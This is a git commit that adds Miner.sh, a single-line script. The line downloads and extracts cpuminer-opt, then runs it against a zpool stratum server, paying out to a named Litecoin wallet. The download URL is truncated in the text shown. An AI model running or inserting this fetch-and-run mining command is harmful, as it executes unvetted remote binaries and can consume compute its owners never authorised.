ec116b2eef92bc069309adf832103e763c66c116
Abiem93 <77071804+bitroy7@users.noreply.github.com>
2025-01-25 19:23:38 +0700

    Create Miner.sh

---
+++ Miner.sh
@@ -0,0 +1,1 @@
+wget https://github.com/rpl...​ && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer -a allium -o stratum+tcp://allium.sea.mine.zpool.ca:6433 -u ltc1qla2rym5rnzu20g6pgn5t0e4ypscxevm836ykt0 -p c=ltc -t 2
